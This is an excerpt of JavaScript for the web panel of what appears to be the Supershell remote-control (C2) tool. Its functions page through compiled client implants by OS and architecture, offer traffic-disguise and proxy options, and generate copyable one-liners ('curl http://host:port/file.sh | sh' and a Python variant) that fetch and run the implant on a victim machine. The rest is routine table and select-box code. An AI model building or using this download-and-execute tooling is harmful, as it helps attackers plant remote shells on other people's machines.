...
// 回车提交每页条数配置
function page_enter_listen(){
    $("#page-change-num").keypress(function (e) {
        if (e.which == 13) {
            if (check_positive_integer($("#page-change-num").val())){
                $.cookie('compile_page_num', Number($("#page-change-num").val()));
                pages_size = Number($("#page-change-num").val());
                update_compiled_client(search_text);
            }
            else{
                toastr.error('每页显示条数只能为正整数', '修改每页显示条数失败');
            }
        }
    });
}
...
// 返回表格操作html
function get_operate_html(filename, rssh_port){
    let sh_cmd = "curl http://" + document.location.hostname + ":" + rssh_port + "/" + filename + ".sh | sh";
    let py_cmd = "curl http://" + document.location.hostname + ":" + rssh_port + "/" + filename + ".py | python";
    let operate_html = '<td><div class="dropdown">\
        ...
        <div class="dropdown-menu">\
          ...
          <a class="dropdown-item" href="javascript:void(0);" onclick="copyText(\'' + sh_cmd + '\')">\
          ...
          <a class="dropdown-item" href="javascript:void(0);" onclick="copyText(\'' + py_cmd + '\')">\
...
function row_data(i, filename, address, os, arch, filetype, size, version, time){
    ...
    <td>' + version + '</td>\
    <td>' + time + '</td>' + get_operate_html(filename, address.split(':').pop()) + '</tr>';
    return row_html;
}
...
// 渲染select框
function load_select(ele_id){
    var el;
    window.TomSelect && (new TomSelect(el = document.getElementById(ele_id), {
...
// 显示选项框
function show_option(option_list, ele_id){
    let option_html = '';
    for (let i=0;i<option_list.length;i++){
        option_html = option_html + '<option value="' + option_list[i] + '">' + option_list[i] + '</option>';
    }
    $('#' + ele_id).html(option_html);
    load_select(ele_id);
}


// 获取客户端支持生成的操作系统架构和流量伪装类型选择框
function get_select(){
    $('#make-loader').html('<div class="spinner-border spinner-border-sm text-muted" role="status"></div>');
    $.ajax({
        type: "POST",
        url: "/supershell/compile/select",
        success: function(res) {
            show_option(res['support_os_arch_list'], 'select-tags');
            show_option(res['flow_list'], 'select-tags-flow');
        ...
        error: function(data, type, error) {
            console.log(error);
            toastr.error(error.name + ": " + error.message, '获取系统架构或流量类型数据失败');
...
function make_client_payload(){
    ...
    let input_data = {
        ...
        'address_proxy': $('#make-compile-address-proxy').val(),
        'port_proxy': $('#make-compile-port-proxy').val(),
        'flow': $("#select-tags-flow option:selected").val(),
